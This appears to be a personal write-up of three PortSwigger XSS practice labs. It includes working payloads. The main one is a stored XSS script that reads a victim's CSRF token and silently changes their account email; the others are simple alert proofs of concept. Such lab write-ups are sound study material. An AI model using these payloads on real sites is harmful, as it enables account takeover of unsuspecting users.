# Cross-site Scripting (XSS)
Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious client-side scripts, typically JavaScript, into web pages viewed by other users.

## Labs completed

| # | Lab Name | Category | Status |
|---|---|---|---|
| 1 | Exploiting XSS to bypass CSRF defenses | XSS | ✅ Solved |
| 2 | Reflected XSS into HTML context with nothing encoded | XSS | ✅ Solved |
| 3 | Stored XSS into HTML context with nothing encoded | XSS | ✅ Solved |

## Key Techniques

**Lab 1 — Exploiting XSS to bypass CSRF defenses**
Stored XSS in blog comments. Payload fetches victim's account page, 
extracts CSRF token using regex, then uses that token to submit a POST 
request changing the victim's email address — all executed silently 
in the victim's browser without their knowledge.
**Payload:**
```html
<script>
fetch('/my-account')
  .then(response => response.text())
  .then(html => {
    var token = html.match(/name="csrf" value="(\w+)"/)[1];
    fetch('/my-account/change-email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'csrf=' + token + '&email=test2@test.com'
    });
  });
</script>
```

**Lab 2 - Reflected XSS into HTML context with nothing encoded**
Reflected XSS in search functionality. User input reflected directly into 
page HTML with zero escaping or filtering — payload executes immediately.
**Payload:**
```html
<script>alert('xss')</script>
```

**Lab 3 - Stored XSS into HTML context with nothing encoded**
Stored XSS in comment functionality. The comment reflected directly to someone who views it
**Payload:**
```html
<script>alert('xss')</script>
```

## Disclaimer
This is performed for educational use only on legal, intentionally vulnerable 
environments such as PortSwigger Web Security Academy labs.